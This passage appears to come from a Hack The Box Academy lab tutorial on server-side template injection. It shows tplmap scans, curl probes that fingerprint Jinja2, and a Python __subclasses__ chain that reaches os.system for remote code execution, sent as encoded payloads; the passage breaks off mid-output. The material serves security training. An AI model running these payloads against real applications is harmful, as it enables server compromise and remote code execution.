As already mentioned in previous sections, `tplmap` can be used to automate both the template engine identification and exploitation process:
```
user@htb[/htb]$ ./tplmap.py -u 'http://<TARGET IP>:<PORT>/jointheteam' -d email=blah

    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if POST parameter 'email' is injectable
[+] Smarty plugin is testing rendering with tag '*'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
[+] Mako plugin is testing blind injection
[+] Python plugin is testing rendering with tag 'str(*)'
[+] Python plugin is testing blind injection
[+] Tornado plugin is testing rendering with tag '{{*}}'
[+] Tornado plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:

  POST parameter: email
  Engine: Tornado
  Injection: {{*}}
  Context: text
  OS: posix-linux
  Technique: render
  Capabilities:

   Shell command execution: ok
   Bind and reverse shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, python code

[+] Rerun tplmap providing one of the following options:

    --os-shell				Run shell on the target
    --os-cmd				Execute shell commands
    --bind-shell PORT			Connect to a shell bind to a target port
    --reverse-shell HOST PORT	Send a shell back to the attacker's port
    --upload LOCAL REMOTE	Upload files to the server
    --download REMOTE LOCAL	Download remote files
```

## SSTI Exploitation Example 3

### SSTI Identification
Let's check the last application in the SSTI series. Once again, our focus will be on identifying if the application is vulnerable to Server-Side Template Injection:
|[jinja1](https://academy.hackthebox.com/storage/modules/145/img/jinja1.png)

User input is submitted via the `cmd` parameter through a GET request. Let's submit mathematical expressions in curly brackets in the input field, such as the ones mentioned on the `SSTI Identification` section, starting with `{7*7}`:
```
user@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd={7*7}"

<!DOCTYPE html>
<html lang="en">
<style type="text/css">
	#command {
		resize: horizontal;
		background-color : transparent;
		border-color: transparent;
		font-size: 15px;
		width: 200px;

	}
	#command:active {
        width: auto;   
    }
</style>
<head>
	<meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1" />
	<link rel="stylesheet" href="/static/css/jquery-ui.css">
	<script src="/static/js/jquery-1.12.4.js"></script>
	<script src="/static/js/jquery-ui.js"></script>
	<script src="/static/js/script.js"></script>	
	<link rel="stylesheet" type="text/css" href="/static/css/style.css" />
	<title>Windows</title>
</head>
<body>
	<div id="desktop">
		<div class="window" data-title="Run">
			<form action="/execute" method="get">
				<a>C:\><input type="text" name="cmd" id="command"></a>
				<br/>
				<a>{7*7}</a>
				<br/>
				<input type="submit" value="execute">
			</form>
		</div>
		<div class="window" data-title="Windows">
			<h1>Windows</h1>
			<p>Minimize the windows to the taskbar, make them full screen or close them.</p>
			<p>Drag the title bar to move the windows or resize them from the bottom right corner.</p>
		</div>
		
		<div id="taskbar">		
		</div>
		
		<div id="icons">
			<a class="openWindow" data-id="0">Run</a>
			<a class="openWindow" data-id="1">Welcome</a>
		</div>
		<font size="5px"><a href="https://html5-templates.com/" rel="nofollow" target="_blank" id="templateLink">&copy; HTML5-Templates.com</a></font>
		<!-- You can use this template freely if you leave a visible link to HTML5-Templates.com -->
	</div>
</body>
```
It doesn't look like the application evaluated the submitted expression. Let us continue with another expression, `${7*7}` this time:
```
user@htb[/htb]$ curl -gs 'http://<TARGET IP>:<PORT>/execute?cmd=${7*7}'

<!DOCTYPE html>
<html lang="en">
<style type="text/css">
	#command {
		resize: horizontal;
		background-color : transparent;
		border-color: transparent;
		font-size: 15px;
		width: 200px;

	}
	#command:active {
        width: auto;   
    }
</style>
<head>
	<meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1" />
	<link rel="stylesheet" href="/static/css/jquery-ui.css">
	<script src="/static/js/jquery-1.12.4.js"></script>
	<script src="/static/js/jquery-ui.js"></script>
	<script src="/static/js/script.js"></script>	
	<link rel="stylesheet" type="text/css" href="/static/css/style.css" />
	<title>Windows</title>
</head>
<body>
	<div id="desktop">
		<div class="window" data-title="Run">
			<form action="/execute" method="get">
				<a>C:\><input type="text" name="cmd" id="command"></a>
				<br/>
				<a>${7*7}</a>
				<br/>
				<input type="submit" value="execute">
			</form>
		</div>
		<div class="window" data-title="Windows">
			<h1>Windows</h1>
			<p>Minimize the windows to the taskbar, make them full screen or close them.</p>
			<p>Drag the title bar to move the windows or resize them from the bottom right corner.</p>
		</div>
		
		<div id="taskbar">		
		</div>
		
		<div id="icons">
			<a class="openWindow" data-id="0">Run</a>
			<a class="openWindow" data-id="1">Welcome</a>
		</div>
		<font size="5px"><a href="https://html5-templates.com/" rel="nofollow" target="_blank" id="templateLink">&copy; HTML5-Templates.com</a></font>
		<!-- You can use this template freely if you leave a visible link to HTML5-Templates.com -->
	</div>
</body>
```
It doesn't look like the application evaluated this expression either. What about `{{7*7}}`?
```
user@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd={{7*7}}"

<!DOCTYPE html>
<html lang="en">
<style type="text/css">
	#command {
		resize: horizontal;
		background-color : transparent;
		border-color: transparent;
		font-size: 15px;
		width: 200px;

	}
	#command:active {
        width: auto;   
    }
</style>
<head>
	<meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1" />
	<link rel="stylesheet" href="/static/css/jquery-ui.css">
	<script src="/static/js/jquery-1.12.4.js"></script>
	<script src="/static/js/jquery-ui.js"></script>
	<script src="/static/js/script.js"></script>	
	<link rel="stylesheet" type="text/css" href="/static/css/style.css" />
	<title>Windows</title>
</head>
<body>
	<div id="desktop">
		<div class="window" data-title="Run">
			<form action="/execute" method="get">
				<a>C:\><input type="text" name="cmd" id="command"></a>
				<br/>
				<a>49</a>
				<br/>
				<input type="submit" value="execute">
			</form>
		</div>
		<div class="window" data-title="Windows">
			<h1>Windows</h1>
			<p>Minimize the windows to the taskbar, make them full screen or close them.</p>
			<p>Drag the title bar to move the windows or resize them from the bottom right corner.</p>
		</div>
		
		<div id="taskbar">		
		</div>
		
		<div id="icons">
			<a class="openWindow" data-id="0">Run</a>
			<a class="openWindow" data-id="1">Welcome</a>
		</div>
		<font size="5px"><a href="https://html5-templates.com/" rel="nofollow" target="_blank" id="templateLink">&copy; HTML5-Templates.com</a></font>
		<!-- You can use this template freely if you leave a visible link to HTML5-Templates.com -->
	</div>
</body>
```
Luckily this time, the application evaluated the latest mathematical expression we submitted and returned the result, 49. It looks like we may be dealing with an SSTI vulnerability!

As already mentioned, the first thing we need to do when dealing with SSTI vulnerabilities is to identify the template engine the application is utilizing. Once again, let's use PortSwigger's diagram in the `SSTI Identification`. We already know that the `{{7*7}}` expression was evaluated successfully. The next expression the diagram suggests trying is `{{7*'7'}}`. Let us try it and see how the application responds:
```
user@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd={{7*'7'}}"

<!DOCTYPE html>
<html lang="en">
<style type="text/css">
	#command {
		resize: horizontal;
		background-color : transparent;
		border-color: transparent;
		font-size: 15px;
		width: 200px;

	}
	#command:active {
        width: auto;   
    }
</style>
<head>
	<meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1" />
	<link rel="stylesheet" href="/static/css/jquery-ui.css">
	<script src="/static/js/jquery-1.12.4.js"></script>
	<script src="/static/js/jquery-ui.js"></script>
	<script src="/static/js/script.js"></script>	
	<link rel="stylesheet" type="text/css" href="/static/css/style.css" />
	<title>Windows</title>
</head>
<body>
	<div id="desktop">
		<div class="window" data-title="Run">
			<form action="/execute" method="get">
				<a>C:\><input type="text" name="cmd" id="command"></a>
				<br/>
				<a>7777777</a>
				<br/>
				<input type="submit" value="execute">
			</form>
		</div>
		<div class="window" data-title="Windows">
			<h1>Windows</h1>
			<p>Minimize the windows to the taskbar, make them full screen or close them.</p>
			<p>Drag the title bar to move the windows or resize them from the bottom right corner.</p>
		</div>
		
		<div id="taskbar">		
		</div>
		
		<div id="icons">
			<a class="openWindow" data-id="0">Run</a>
			<a class="openWindow" data-id="1">Welcome</a>
		</div>
		<font size="5px"><a href="https://html5-templates.com/" rel="nofollow" target="_blank" id="templateLink">&copy; HTML5-Templates.com</a></font>
		<!-- You can use this template freely if you leave a visible link to HTML5-Templates.com -->
	</div>
</body>
```
The application successfully evaluated this expression as well. According to PortSwigger's diagram, we are dealing with either a Jinja2 or a Twig template engine. That being said, the fact that `{{7*'7'}}` was evaluated with the application returning 7777777 means that Jinja2 is being utilized on the backend.

We could have automated the template engine identification process we just executed through `tplmap`, as follows:
```
user@htb[/htb]$ ./tplmap.py -u 'http://<TARGET IP>:<PORT>/execute?cmd'

    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if GET parameter 'cmd' is injectable
[+] Smarty plugin is testing rendering with tag '*'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
[+] Mako plugin is testing blind injection
[+] Python plugin is testing rendering with tag 'str(*)'
[+] Python plugin is testing blind injection
[+] Tornado plugin is testing rendering with tag '{{*}}'
[+] Tornado plugin is testing blind injection
[+] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:

  GET parameter: cmd
  Engine: Jinja2
  Injection: {{*}}
  Context: text
  OS: posix-linux
  Technique: render
  Capabilities:

   Shell command execution: ok
   Bind and reverse shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, python code

[+] Rerun tplmap providing one of the following options:

    --os-shell				Run shell on the target
    --os-cmd				Execute shell commands
    --bind-shell PORT			Connect to a shell bind to a target port
    --reverse-shell HOST PORT	Send a shell back to the attacker's port
    --upload LOCAL REMOTE	Upload files to the server
    --download REMOTE LOCAL	Download remote files
```
The next step is to gain remote code execution on the target server. Before moving to the payload development part, let's look at some Python for SSTI.

### Python Primer for SSTI
Below is a small dictionary from [fatalerrors.org](https://www.fatalerrors.org/a/0dhx1Dk.html) to refer to when going over the Jinja2 payload development part of this section:
| No. | Methods | Description |
| --- | ------- | ----------- |
| 1. | `__class__` | Returns the object (class) to which the type belongs |
| 2. | `__mro__` | Returns a tuple containing the base class inherited by the object. Methods are parsed in the order of tuples. |
| 3. | `__subclasses__` | Each new class retains references to subclasses, and this method returns a list of references that are still available in the class |
| 4. | `__builtins__` | Returns the builtin methods included in a function |
| 5. | `__globals__` | A reference to a dictionary that contains global variables for a function |
| 6. | `__base__` | Returns the base class inherited by the object <-- (__ base__ and __ mro__ are used to find the base class) | |
| 7. | `__init__` | Class initialization method |

Start by running Python on Pwnbox's or a local VM's terminal, then follow along:
```
user@htb[/htb]$ python3

Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 
```
Create a string object and use `type` and `__class__`, as follows (they have the same tasks: check the type of an object). Then use the `dir()` command to show all methods and attributes from the object:
```python
>>> import flask
>>> s = 'HTB'
>>> type(s)

<class 'str'>


>>> s.__class__

<class 'str'>


>>> dir(s)

['__add__', '__class__', '__contains__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getnewargs__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__mod__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__rmod__', '__rmul__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'capitalize', 'casefold', 'center', 'count', 'encode', 'endswith', 'expandtabs', 'find', 'format', 'format_map', 'index', 'isalnum', 'isalpha', 'isascii', 'isdecimal', 'isdigit', 'isidentifier', 'islower', 'isnumeric', 'isprintable', 'isspace', 'istitle', 'isupper', 'join', 'ljust', 'lower', 'lstrip', 'maketrans', 'partition', 'replace', 'rfind', 'rindex', 'rjust', 'rpartition', 'rsplit', 'rstrip', 'split', 'splitlines', 'startswith', 'strip', 'swapcase', 'title', 'translate', 'upper', 'zfill']
```
Here, the output shown by `dir()` consists of "magic" (or "dunder") methods, that are the methods between `__` in the name, and their purpose is for operator overloading. Operator overloading means provided additional functionality to the operators, the python implicitly invokes the magic methods to provide additional functionality to them. For example, when we type `a + b`, the `__add__` magic method is called for perfoming the addition. A very good source of these examples are on https://www.analyticsvidhya.com/blog/2021/08/explore-the-magic-methods-in-python/ and https://python-course.eu/oop/magic-methods.php and https://rszalski.github.io/magicmethods/

The remaining elements are the methods of the object `String` (source: https://docs.python.org/3.9/library/stdtypes.html#string-methods)


The next step is to understand Python's hierarchy. Using `__mro__` or `mro()`, we can go back up to three inherited objects in the Python environment. Let's practice this as follows:
```python
>>> s.__class__.__class__

<class 'type'>
```
Here we get `<class 'type'>` because the type of `s` is `str` as expected (because `s` is an instance of class `str`), but the type of `str`, the class itself, is `type`. In general, the type of any new-style class is `type` (source: https://realpython.com/python-metaclasses/#:~:text=type%20is%20a%20metaclass%2C%20of,an%20instance%20of%20class%20Foo%20.).

Now, it is important to be able to access to all the classes in Python, because could be some restrictions placed on the global and local namespaces in the functions we want to call.

In Python, each object has an attribute `__class__` that returns the class implementing the object. Furthermore, each class has an attribute `__base__` that points to the [object](https://docs.python.org/3/library/functions.html#object) class that is **the base class of all the Python classes**. Indeed:
```python
>>> s.__class__.__base__

<class 'object'>
```
Through this, we can access to all Python classes:
```python
>>> s.__class__.__base__.__subclasses__()

[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_reverseitemiterator'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>,
 <SNIP>
```
What `__subclasses__` needs is the `object` type. Indeed, in an unrestricted case, also `object.__subclasses__()` can give us the same output.

We can reach the same result by using the attribute `__mro__`. The MRO in `__mro__` stands for "Method Resolution Order", and is defined [here](https://docs.python.org/release/2.6.4/library/stdtypes.html#class.__mro__) as, "a tuple of classes that are considered when looking for base classes during method resolution." The `__mro__` attribute consists of the object's inheritance map in a tuple consisting of the class, its base, its base's base, and so on up to object (if using new-style classes). It is an attribute of each object's metaclass, but is a truly hidden attribute, as Python explicitely leaves it out of dir output when conducting introspection.

The `__subclasses__` attribute is defined [here](https://docs.python.org/release/2.6.4/library/stdtypes.html#class.__subclasses__) as a method that "keeps a list of weak references to its immediate subclasses." for each new-style class, and "returns a list of all those references still alive."

Summarizing, `__mro__` allows us to go back up the tree of inherited objects in the current Python environment, and `__subclasses__` lets us come back down. So what's the impact on the search of a greater exploit for SSTI in Flask/Jinja2? By starting with a new-type object, e.g. type `str`, we can crawl up the inheritance tree to the root `object` class using `__mro__`, then crawl back down to every new-style object in the Python environment using `__subclasses__`. Yes, this gives us access to every class loaded in the current python environment. An example of exploitation is [here](https://www.lanmaster53.com/2016/03/11/exploring-ssti-flask-jinja2-part-2/).

Anyway, let's use `mro()` (or `__mro__`) function to get all classes loaded in the current python environment. If we use `mro()` as `s.__class__.mro()`, we get the tuple of `[<class 'str'>, <class 'object'>]`:
```python
>>> s.__class__.mro()

[<class 'str'>, <class 'object'>]
```
so, for taking all the classes, we must refer to the `<class 'object'>` at `mro()[1]`:
```python 
>>> s.__class__.mro()[1].__subclasses__()

[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_reverseitemiterator'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>,
 <SNIP>
```
Now, let us look for useful classes that can facilitate remote code execution:
```python
>>> x = s.__class__.mro()[1].__subclasses__()
>>> for i in range(len(x)):print(i, x[i].__name__)
...
0 type
1 weakref
2 weakcallableproxy
3 weakproxy
4 int
5 bytearray
6 bytes
7 list
8 NoneType
<SNIP>

>>> def searchfunc(name):
...     x = s.__class__.mro()[1].__subclasses__()
...     for i in range(len(x)):
...             fn = x[i].__name__
...             if fn.find(name) > -1:
...                     print(i, fn)
...
>>> searchfunc('warning')

215 catch_warnings
```
Why are we searching for `warning` you may ask. We chose this class because it imports Python's [sys module](https://github.com/python/cpython/blob/3.9/Lib/warnings.py#L3), and from `sys`, the `os` module can be reached. More precisely, os modules are all from `warnings.catch_`.

Please note that you will probably come across a different number. Back to our Python for SSTI specifics, we have seen that `catch_warnings` is present without importing any additional module to our Python console. Let's continue our journey:
```python
>>> y = x[215]
>>> y

<class 'warnings.catch_warnings'>
```
Note: if you want to know from which file the module of a specific class comes, for example if you want to know where is the file of `warnings` module containing the `catch_warnings` class, type:
```python
>>> y()._module
<module 'warnings' from '/usr/lib/python3.9/warnings.py'>
```
Now, let's enumerate the builtins from this class as follows: 
```python
>>> y()._module.__builtins__

{'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>), '__build_class__': <built-in function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': <built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'format': <built-in function format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>,
 <SNIP>


>>> z = y()._module.__builtins__
>>> for i in z:
...     if i.find('import') >-1:
...             print(i, z[i])
...	
__import__ <built-in function __import__>
```
Note: I tested on my local machine all the other classes for checking if they have `__import__` module but for all of them, except for `catch_warnings`, I get different errors on `y()`, so I don't know how to access to `._module.__builtins__`. For this small test I made this Python script:
```python
#!/usr/bin/env python3

def searchimp():
    s = ''
    x = s.__class__.mro()[1].__subclasses__()
    for i in range(len(x)):
        y = x[i]
        fn = x[i].__name__
        try:
            z = y()._module.__builtins__
        
            for j in z:
                if j.find('import') > -1:
                    print (i, fn)
                    print (j, z[j])
        except:
        	print(str(i) + ': error')
searchimp()
```

Coming back to the exercise, it seems we have reached the import function by walking the hierarchy. This means we can load `os` and use the `system` function to execute code all coming from a string object, as follows:
```python
>>> ''.__class__.__mro__[1].__subclasses__()

[215]()._module.__builtins__['__import__']('os').system('echo RCE from a string object')
RCE from a string object
0
```
Returning to our vulnerable web application, let's see how we can repeat the same process and develop an RCE payload. Remember that the below payloads can be submitted to the application via the browser as is or via cURL after being URL encoded.
**Payload**
```python
{{ ''.__class__ }}
```

**Curl - Interacting with the Target**
```
user@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__%20%7D%7D"

<SNIP>
<body>
	<div id="desktop">
		<div class="window" data-title="Run">
			<form action="/execute" method="get">
				<a>C:\><input type="text" name="cmd" id="command"></a>
				<br/>
				<a>&lt;class &#39;str&#39;&gt;</a>
				<br/>
				<input type="submit" value="execute">
			</form>
		</div>
<SNIP>
</body>
```

**Payload**
```python
{{ ''.__class__.__mro__ }}
```

**Curl - Interacting with the Target**
```
user@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%20%7D%7D"

<SNIP>
<body>
	<div id="desktop">
		<div class="window" data-title="Run">
			<form action="/execute" method="get">
				<a>C:\><input type="text" name="cmd" id="command"></a>
				<br/>
				<a>(&lt;class &#39;str&#39;&gt;, &lt;class &#39;object&#39;&gt;)</a>
				<br/>
				<input type="submit" value="execute">
			</form>
		</div>
<SNIP>
</body>
```
We are interested in the second item, so the payload should become:
```python
{{ ''.__class__.__mro__[1] }}
```

```
user@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%20%7D%7D"

<SNIP>
<body>
	<div id="desktop">
		<div class="window" data-title="Run">
			<form action="/execute" method="get">
				<a>C:\><input type="text" name="cmd" id="command"></a>
				<br/>
				<a>&lt;class &#39;object&#39;&gt;</a>
				<br/>
				<input type="submit" value="execute">
			</form>
		</div>
<SNIP>
</body>
```
Let us start walking down the hierarchy, as follows.
```python
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

```
user@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%20%7D%7D"

<SNIP>
<body>
	<div id="desktop">
		<div class="window" data-title="Run">
			<form action="/execute" method="get">
				<a>C:\><input type="text" name="cmd" id="command"></a>
				<br/>
				<a>[&lt;class &#39;type&#39;&gt;, &lt;class &#39;weakref&#39;&gt;, &lt;class &#39;weakcallableproxy&#39;&gt;, &lt;class &#39;weakproxy&#39;&gt;, &lt;class &#39;int&#39;&gt;, &lt;class &#39;bytearray&#39;&gt;, &lt;class &#39;bytes&#39;&gt;, &lt;class &#39;list&#39;&gt;, &lt;class &#39;NoneType&#39;&gt;, &lt;class &#39;NotImplementedType&#39;&gt;, &lt;class &#39;traceback&#39;&gt;, &lt;class &#39;super&#39;&gt;, &lt;class &#39;range&#39;&gt;, &lt;class &#39;dict&#39;&gt;, &lt;class &#39;dict_keys&#39;&gt;, &lt;class &#39;dict_values&#39;&gt;, &lt;class &#39;dict_items&#39;&gt;, &lt;class &#39;dict_reversekeyiterator&#39;&gt;, &lt;class &#39;dict_reversevalueiterator&#39;&gt;, &lt;class &#39;dict_reverseitemiterator&#39;&gt;, &lt;class &#39;odict_iterator&#39;&gt;, &lt;class &#39;set&#39;&gt;, &lt;class &#39;str&#39;&gt;, &lt;class &#39;slice&#39;&gt;, &lt;class &#39;staticmethod&#39;&gt;, &lt;class &#39;complex&#39;&gt;, &lt;class &#39;float&#39;&gt;, &lt;class &#39;frozenset&#39;&gt;, &lt;class &#39;property&#39;&gt;, &lt;class &#39;managedbuffer&#39;&gt;, &lt;class &#39;memoryview&#39;&gt;, &lt;class &#39;tuple&#39;&gt;, &lt;class &#39;enumerate&#39;&gt;, &lt;class &#39;reversed&#39;&gt;, &lt;class &#39;stderrprinter&#39;&gt;, &lt;class &#39;code&#39;&gt;, &lt;class &#39;frame&#39;&gt;, &lt;class &#39;builtin_function_or_method&#39;&gt;, &lt;class &#39;method&#39;&gt;, &lt;class &#39;function&#39;&gt;, &lt;class &#39;mappingproxy&#39;&gt;, &lt;class &#39;generator&#39;&gt;, &lt;class &#39;getset_descriptor&#39;&gt;, &lt;class &#39;wrapper_descriptor&#39;&gt;, &lt;class &#39;method-wrapper&#39;&gt;, &lt;class &#39;ellipsis&#39;&gt;, &lt;class &#39;member_descriptor&#39;&gt;, &lt;class &#39;types.SimpleNamespace&#39;&gt;, &lt;class &#39;PyCapsule&#39;&gt;, &lt;class &#39;longrange_iterator&#39;&gt;, &lt;class &#39;cell&#39;&gt;, &lt;class &#39;instancemethod&#39;&gt;, &lt;class &#39;classmethod_descriptor&#39;&gt;, &lt;class &#39;method_descriptor&#39;&gt;, &lt;class &#39;callable_iterator&#39;&gt;, &lt;class &#39;iterator&#39;&gt;, &lt;class &#39;pickle.PickleBuffer&#39;&gt;, &lt;class &#39;coroutine&#39;&gt;, &lt;class &#39;coroutine_wrapper&#39;&gt;, &lt;class &#39;InterpreterID&#39;&gt;, &lt;class &#39;EncodingMap&#39;&gt;, &lt;class &#39;fieldnameiterator&#39;&gt;, &lt;class &#39;formatteriterator&#39;&gt;, &lt;class &#39;BaseException&#39;&gt;, &lt;class &#39;hamt&#39;&gt;, &lt;class &#39;hamt_array_node&#39;&gt;, &lt;class &#39;hamt_bitmap_node&#39;&gt;, &lt;class &#39;hamt_collision_node&#39;&gt;, &lt;class &#39;keys&#39;&gt;, &lt;class &#39;values&#39;&gt;, &lt;class &#39;items&#39;&gt;, &lt;class &#39;Context&#39;&gt;, &lt;class &#39;ContextVar&#39;&gt;, &lt;class &#39;Token&#39;&gt;, &lt;class &#39;Token.MISSING&#39;&gt;, &lt;class &#39;moduledef&#39;&gt;, &lt;class &#39;module&#39;&gt;, &lt;class &#39;filter&#39;&gt;, &lt;class &#39;map&#39;&gt;, &lt;class &#39;zip&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt;, &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt;, &lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&gt;, &lt;class &#39;classmethod&#39;&gt;, &lt;class &#39;_frozen_importlib.FrozenImporter&#39;&gt;, &lt;class &#39;_frozen_importlib._ImportLockContext&#39;&gt;, &lt;class &#39;_thread._localdummy&#39;&gt;, &lt;class &#39;_thread._local&#39;&gt;, &lt;class &#39;_thread.lock&#39;&gt;, &lt;class &#39;_thread.RLock&#39;&gt;, &lt;class &#39;_io._IOBase&#39;&gt;, &lt;class &#39;_io._BytesIOBuffer&#39;&gt;, &lt;class &#39;_io.IncrementalNewlineDecoder&#39;&gt;, &lt;class &#39;posix.ScandirIterator&#39;&gt;, &lt;class &#39;posix.DirEntry&#39;&gt;, &lt;class &#39;_frozen_importlib_external.WindowsRegistryFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external._LoaderBasics&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external.PathFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt;, &lt;class &#39;zipimport.zipimporter&#39;&gt;, &lt;class &#39;zipimport._ZipImportResourceReader&#39;&gt;, &lt;class &#39;codecs.Codec&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &lt;class &#39;codecs.StreamReaderWriter&#39;&gt;, &lt;class &#39;codecs.StreamRecoder&#39;&gt;, &lt;class &#39;_abc_data&#39;&gt;, &lt;class &#39;abc.ABC&#39;&gt;, &lt;class &#39;dict_itemiterator&#39;&gt;, &lt;class &#39;collections.abc.Hashable&#39;&gt;, &lt;class &#39;collections.abc.Awaitable&#39;&gt;, &lt;class &#39;collections.abc.AsyncIterable&#39;&gt;, &lt;class &#39;async_generator&#39;&gt;, &lt;class &#39;collections.abc.Iterable&#39;&gt;, &lt;class &#39;bytes_iterator&#39;&gt;, &lt;class &#39;bytearray_iterator&#39;&gt;, &lt;class &#39;dict_keyiterator&#39;&gt;, &lt;class &#39;dict_valueiterator&#39;&gt;, &lt;class &#39;list_iterator&#39;&gt;, &lt;class &#39;list_reverseiterator&#39;&gt;, &lt;class &#39;range_iterator&#39;&gt;, &lt;class &#39;set_iterator&#39;&gt;, &lt;class &#39;str_iterator&#39;&gt;, &lt;class &#39;tuple_iterator&#39;&gt;, &lt;class &#39;collections.abc.Sized&#39;&gt;, &lt;class &#39;collections.abc.Container&#39;&gt;, &lt;class &#39;collections.abc.Callable&#39;&gt;, &lt;class &#39;os._wrap_close&#39;&gt;, &lt;class &#39;_sitebuiltins.Quitter&#39;&gt;, &lt;class &#39;_sitebuiltins._Printer&#39;&gt;, &lt;class &#39;_sitebuiltins._Helper&#39;&gt;, &lt;class &#39;operator.itemgetter&#39;&gt;, &lt;class &#39;operator.attrgetter&#39;&gt;, &lt;class &#39;operator.methodcaller&#39;&gt;, &lt;class &#39;itertools.accumulate&#39;&gt;, &lt;class &#39;itertools.combinations&#39;&gt;, &lt;class &#39;itertools.combinations_with_replacement&#39;&gt;, &lt;class &#39;itertools.cycle&#39;&gt;, &lt;class &#39;itertools.dropwhile&#39;&gt;, &lt;class &#39;itertools.takewhile&#39;&gt;, &lt;class &#39;itertools.islice&#39;&gt;, &lt;class &#39;itertools.starmap&#39;&gt;, &lt;class &#39;itertools.chain&#39;&gt;, &lt;class &#39;itertools.compress&#39;&gt;, &lt;class &#39;itertools.filterfalse&#39;&gt;, &lt;class &#39;itertools.count&#39;&gt;, &lt;class &#39;itertools.zip_longest&#39;&gt;, &lt;class &#39;itertools.permutations&#39;&gt;, &lt;class &#39;itertools.product&#39;&gt;, &lt;class &#39;itertools.repeat&#39;&gt;, &lt;class &#39;itertools.groupby&#39;&gt;, &lt;class 